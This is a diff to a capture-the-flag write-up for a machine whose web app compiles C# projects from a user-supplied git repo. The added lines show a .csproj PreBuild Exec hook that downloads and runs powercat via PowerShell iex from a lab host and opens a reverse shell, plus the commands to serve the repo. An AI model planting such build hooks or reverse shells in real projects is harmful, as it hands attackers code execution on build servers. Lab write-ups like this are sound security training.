@@ -41,6 +41,7 @@ So there is an Apache 2.4.56 web server running on port 80. We can inspect the s
 
 Browsing the site with firefox, we find web app for compiling visual studio projects. After supplying a link to a git repo, the app compiles the net 6.0 and c# projects and uploads them in the site.
 
+
 ### PHASE 2: USER
 Let's begin preparing a local http git repo serving a visual studio solution. For this make a directory called `repo` and create a new visual studio solution called `repo.sln`
 ```markdown
@@ -138,6 +139,38 @@ Keyboard interrupt received, exiting.
 ```
 
 ![visual2](https://github.com/g1vi/Write-up/assets/120142960/30e914ad-fd62-4141-a0bb-3f3cb841d533)
+
+We have to find a way to make the server execute the code after compiling it. This can be done manipulating pre and post events in the c# `.csproj` project file. These events are triggered by the msbuild compiler before or after the compiling process ends. We will add a pre event, calling a powercat reverse shell before the building process begins. Just create any Program.cs source file and in the `myapp.csproj` file, add the pre event
+```markdown
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net6.0</TargetFramework>
+    <ImplicitUsings>enable</ImplicitUsings>
+    <Nullable>enable</Nullable>
+  </PropertyGroup>
+
+  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+    <Exec Command="powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.80:8080/powercat.ps1');powercat -c 10.10.14.59 -p 1919 -e cmd" />
+  </Target>
+
+</Project>
+```
+After this, add again all files to git, commit, update server info and restart the python http server (from .git directory)
+```markdown
+cd repo
+git add .
+git commit -m 'commit'
+cd .git
+git update-server-info
+python3 -m http.server 80
+```
+Start another python http serving powercat.ps1 and start a listener on port 1919. Enter red box ip in the web app url box, after the c# files are pulled, a reverse shell is received on port 1919
+
+### PHASE 3: SYSTEM
+
+
 
 
 
